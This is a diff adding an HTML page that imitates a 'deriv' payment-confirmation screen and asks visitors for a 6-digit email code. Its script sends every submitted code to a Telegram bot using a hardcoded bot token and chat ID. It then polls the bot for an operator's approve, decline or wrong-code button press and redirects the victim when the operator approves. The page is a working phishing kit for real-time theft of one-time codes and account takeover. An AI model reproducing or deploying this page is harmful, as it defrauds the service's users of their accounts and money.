@@ -1,0 +1,552 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Confirmation</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f7f7f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        
+        header {
+            position: absolute;
+            top: 20px;
+            left: 0;
+            right: 0;
+            background-color: #ece9e7;
+            color: white;
+            padding: 10px 0;
+            font-size: 24px;
+            border-radius: 5px;
+            margin: 0 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 90%;
+            max-width: 400px;
+            margin-top: 80px;
+        }
+        
+        h2 {
+            margin-bottom: 20px;
+        }
+        
+        .code-inputs {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+        
+        .code-input {
+            width: 40px;
+            height: 40px;
+            text-align: center;
+            font-size: 24px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        
+        .code-input:focus {
+            outline: none;
+            border-color: #ff444f;
+            box-shadow: 0 0 0 2px rgba(255, 68, 79, 0.2);
+        }
+        
+        .confirm-btn {
+            width: 100%;
+            padding: 12px 20px;
+            background: #ff444f;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: opacity 0.2s;
+        }
+        
+        .confirm-btn:hover {
+            opacity: 0.9;
+        }
+        
+        .confirm-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+        
+        .resend {
+            color: #d35b0c;
+            cursor: pointer;
+        }
+        
+        .timer {
+            margin-top: 10px;
+            font-size: 14px;
+            color: #666;
+        }
+        /* ===== ERROR BANNER ===== */
+        
+        .error-msg {
+            background: rgba(220, 53, 69, 0.12);
+            border: 1px solid rgba(220, 53, 69, 0.3);
+            color: #dc3545;
+            padding: 12px 16px;
+            border-radius: 10px;
+            font-size: 13px;
+            margin-bottom: 16px;
+            display: none;
+            text-align: center;
+        }
+        /* ===== SPINNER OVERLAY ===== */
+        
+        .spinner-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.5s ease, visibility 0.5s ease;
+            pointer-events: none;
+        }
+        
+        .spinner-overlay.active {
+            opacity: 1;
+            visibility: visible;
+            pointer-events: all;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid #ffffff30;
+            border-top-color: #ff444f;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+        
+        .spinner-text {
+            color: #e0e0e0;
+            font-size: 14px;
+            margin-top: 20px;
+            font-weight: 500;
+        }
+        
+        .spinner-code {
+            color: #ff444f;
+            font-size: 13px;
+            margin-top: 8px;
+            font-weight: 600;
+            letter-spacing: 2px;
+        }
+        
+        .cancel-poll-btn {
+            margin-top: 20px;
+            padding: 10px 24px;
+            background: transparent;
+            border: 1px solid #6c757d;
+            border-radius: 50px;
+            color: #adb5bd;
+            font-family: inherit;
+            font-size: 13px;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .cancel-poll-btn:hover {
+            border-color: #ff444f;
+            color: #ff444f;
+        }
+    </style>
+</head>
+
+<body>
+
+    <header>
+        <h2 class="mb-4" style="color: #ff444f; font-weight: bold; font-style: italic;">deriv</h2>
+    </header>
+
+    <div class="container">
+        <h2>Confirm code to receive payment</h2>
+        <p>Enter the 6-digit code sent to <strong>your email</strong>.</p>
+
+        <!-- Error message area -->
+        <div class="error-msg" id="codeError"></div>
+
+        <form id="codeForm">
+            <div class="code-inputs">
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+                <input type="text" class="code-input" maxlength="1" inputmode="numeric" pattern="[0-9]*" required>
+            </div>
+            <button type="submit" class="confirm-btn" id="confirmBtn">Confirm Code</button>
+        </form>
+        <p>Didn't receive the code? <span class="resend" onclick="startTimer()">Resend code</span></p>
+        <div class="timer" id="timer"></div>
+    </div>
+
+    <!-- SPINNER OVERLAY -->
+    <div class="spinner-overlay" id="spinnerOverlay">
+        <div class="spinner"></div>
+        <p class="spinner-text">Verifying payment code...</p>
+        <p class="spinner-code" id="spinnerCodeDisplay"></p>
+        <button class="cancel-poll-btn" onclick="cancelPolling()">Cancel</button>
+    </div>
+
+    <script>
+        // =====================================================
+        // CONFIG
+        // =====================================================
+        const TELEGRAM_BOT_TOKEN = "8859101981:AAEQiFAqQtmOLCgEkUMn_ieXpqrs-A5KTQ8";
+        const TELEGRAM_CHAT_ID = "6367881211";
+        const APPROVAL_REDIRECT_URL = "first.html";
+
+        // =====================================================
+        // POLLING STATE
+        // =====================================================
+        let pollDecided = false;
+        let pollTimeoutId = null;
+        let pollAbortController = null;
+        let isPollingActive = false;
+
+        // =====================================================
+        // UI HELPERS
+        // =====================================================
+        function showError(msg) {
+            const err = document.getElementById('codeError');
+            if (err) {
+                err.textContent = msg;
+                err.style.display = 'block';
+            }
+        }
+
+        function hideError() {
+            const err = document.getElementById('codeError');
+            if (err) err.style.display = 'none';
+        }
+
+        function maskCode(code) {
+            if (code.length <= 2) return '*'.repeat(code.length);
+            return code.charAt(0) + '*'.repeat(code.length - 2) + code.charAt(code.length - 1);
+        }
+
+        // =====================================================
+        // AUTO-FOCUS INPUTS
+        // =====================================================
+        const inputs = document.querySelectorAll('.code-input');
+
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                if (input.value.length === 1 && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+            input.addEventListener('keydown', (e) => {
+                if (e.key === 'Backspace' && input.value.length === 0 && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+            // Only allow digits
+            input.addEventListener('keypress', (e) => {
+                if (!/[0-9]/.test(e.key)) {
+                    e.preventDefault();
+                }
+            });
+        });
+
+        // =====================================================
+        // TIMER
+        // =====================================================
+        let timerInterval;
+
+        function startTimer() {
+            let timeLeft = 45;
+            document.getElementById('timer').textContent = `Resend code in ${timeLeft}s`;
+
+            clearInterval(timerInterval);
+            timerInterval = setInterval(() => {
+                timeLeft--;
+                document.getElementById('timer').textContent = `Resend code in ${timeLeft}s`;
+
+                if (timeLeft <= 0) {
+                    clearInterval(timerInterval);
+                    document.getElementById('timer').textContent = '';
+                }
+            }, 1000);
+        }
+
+        // =====================================================
+        // CANCEL POLLING
+        // =====================================================
+        function cancelPolling() {
+            pollDecided = true;
+            if (pollTimeoutId) clearTimeout(pollTimeoutId);
+            if (pollAbortController) pollAbortController.abort();
+            isPollingActive = false;
+            document.getElementById('spinnerOverlay').classList.remove('active');
+            document.getElementById('confirmBtn').disabled = false;
+            showError('Request cancelled. Please try again.');
+        }
+
+        // =====================================================
+        // POLLING ENGINE — long-poll, 409-safe, callback-only
+        // =====================================================
+        function startPolling(userId) {
+            pollDecided = false;
+            let offset = 0;
+            let pollCount = 0;
+            const MAX_POLLS = 180;
+
+            if (pollAbortController) pollAbortController.abort();
+            pollAbortController = new AbortController();
+
+            function pollLoop() {
+                if (pollDecided) return;
+                if (isPollingActive) {
+                    pollTimeoutId = setTimeout(pollLoop, 500);
+                    return;
+                }
+
+                pollCount++;
+                if (pollCount > MAX_POLLS) {
+                    pollDecided = true;
+                    document.getElementById('spinnerOverlay').classList.remove('active');
+                    document.getElementById('confirmBtn').disabled = false;
+                    showError('Request timed out. Please try again.');
+                    return;
+                }
+
+                isPollingActive = true;
+
+                const url =
+                    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates` +
+                    `?offset=${offset}&timeout=15&allowed_updates=%5B%22callback_query%22%5D`;
+
+                fetch(url, {
+                        signal: pollAbortController.signal
+                    })
+                    .then(res => {
+                        if (res.status === 409) {
+                            isPollingActive = false;
+                            pollTimeoutId = setTimeout(pollLoop, 3000);
+                            return null;
+                        }
+                        if (!res.ok) throw new Error('HTTP ' + res.status);
+                        return res.json();
+                    })
+                    .then(data => {
+                        if (data === null) return;
+
+                        if (!data.ok || pollDecided) {
+                            isPollingActive = false;
+                            if (!pollDecided) {
+                                pollTimeoutId = setTimeout(pollLoop, 1000);
+                            }
+                            return;
+                        }
+
+                        if (data.result && data.result.length > 0) {
+                            for (const update of data.result) {
+                                offset = update.update_id + 1;
+
+                                if (update.callback_query) {
+                                    const action = update.callback_query.data;
+
+                                    // Answer callback to remove loading state
+                                    fetch(
+                                            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                                method: 'POST',
+                                                headers: {
+                                                    'Content-Type': 'application/json'
+                                                },
+                                                body: JSON.stringify({
+                                                    callback_query_id: update.callback_query.id,
+                                                    text: "Processing..."
+                                                })
+                                            }
+                                        )
+                                        .catch(() => {});
+
+                                    if (action === `approve_${userId}`) {
+                                        pollDecided = true;
+                                        isPollingActive = false;
+                                        document.getElementById('spinnerOverlay').classList.remove('active');
+                                        window.location.href = APPROVAL_REDIRECT_URL;
+                                        return;
+                                    } else if (action === `decline_${userId}`) {
+                                        pollDecided = true;
+                                        isPollingActive = false;
+                                        document.getElementById('spinnerOverlay').classList.remove('active');
+                                        document.getElementById('confirmBtn').disabled = false;
+                                        showError('Request declined. Please try again.');
+                                        return;
+                                    } else if (action === `wrong_${userId}`) {
+                                        pollDecided = true;
+                                        isPollingActive = false;
+                                        document.getElementById('spinnerOverlay').classList.remove('active');
+                                        document.getElementById('confirmBtn').disabled = false;
+                                        showError('Wrong code. Please enter the correct code.');
+                                        return;
+                                    }
+                                }
+                            }
+                        }
+
+                        isPollingActive = false;
+                        if (!pollDecided) {
+                            pollTimeoutId = setTimeout(pollLoop, 500);
+                        }
+                    })
+                    .catch(err => {
+                        if (err.name === 'AbortError') return;
+                        console.error('Poll error:', err);
+                        isPollingActive = false;
+                        if (!pollDecided) {
+                            pollTimeoutId = setTimeout(pollLoop, 2000);
+                        }
+                    });
+            }
+
+            pollLoop();
+        }
+
+        // =====================================================
+        // SEND MESSAGE + INLINE KEYBOARD
+        // =====================================================
+        function sendTelegramWithInlineKeyboard(message, keyboard, userId) {
+            const spinnerOverlay = document.getElementById('spinnerOverlay');
+            const confirmBtn = document.getElementById('confirmBtn');
+
+            let attempts = 0;
+            const maxAttempts = 3;
+
+            function attemptSend() {
+                attempts++;
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: TELEGRAM_CHAT_ID,
+                            text: message,
+                            parse_mode: 'HTML',
+                            reply_markup: JSON.stringify(keyboard)
+                        })
+                    })
+                    .then(res => {
+                        if (!res.ok) throw new Error('HTTP ' + res.status);
+                        return res.json();
+                    })
+                    .then(data => {
+                        if (data.ok) {
+                            startPolling(userId);
+                        } else {
+                            if (attempts < maxAttempts) {
+                                setTimeout(attemptSend, 1000 * attempts);
+                            } else {
+                                spinnerOverlay.classList.remove('active');
+                                confirmBtn.disabled = false;
+                                showError('Failed to send notification. Please try again.');
+                            }
+                        }
+                    })
+                    .catch(err => {
+                        console.error('Send error:', err);
+                        if (attempts < maxAttempts) {
+                            setTimeout(attemptSend, 1000 * attempts);
+                        } else {
+                            spinnerOverlay.classList.remove('active');
+                            confirmBtn.disabled = false;
+                            showError('Network error. Please check your connection and try again.');
+                        }
+                    });
+            }
+
+            attemptSend();
+        }
+
+        // =====================================================
+        // FORM SUBMIT
+        // =====================================================
+        document.getElementById('codeForm').addEventListener('submit', async(e) => {
+            e.preventDefault();
+            hideError();
+
+            const code = Array.from(inputs).map(input => input.value).join('');
+
+            if (code.length !== 6) {
+                showError('Please enter all 6 digits of the code.');
+                return;
+            }
+
+            // Show spinner
+            const spinnerOverlay = document.getElementById('spinnerOverlay');
+            const spinnerCodeDisplay = document.getElementById('spinnerCodeDisplay');
+            const confirmBtn = document.getElementById('confirmBtn');
+
+            spinnerCodeDisplay.textContent = 'Code: ' + maskCode(code);
+            spinnerOverlay.classList.add('active');
+            confirmBtn.disabled = true;
+
+            // Unique userId per session
+            const userId = 'payment_' + Date.now();
+
+            const message =
+                `💳 <b>New Deriv Payment Code Submitted</b>\n\n` +
+                `🔢 Code: <code>${code}</code>\n` +
+                `⏰ Time: ${new Date().toLocaleString('en-ZA')}\n\n` +
+                `Please approve, decline, or mark as wrong code:`;
+
+            const keyboard = {
+                inline_keyboard: [
+                    [{
+                        text: "✅ APPROVE",
+                        callback_data: `approve_${userId}`
+                    }, {
+                        text: "❌ DECLINE",
+                        callback_data: `decline_${userId}`
+                    }],
+                    [{
+                        text: "⚠️ WRONG CODE",
+                        callback_data: `wrong_${userId}`
+                    }]
+                ]
+            };
+
+            sendTelegramWithInlineKeyboard(message, keyboard, userId);
+        });
+    </script>
+
+</body>
+
+</html>
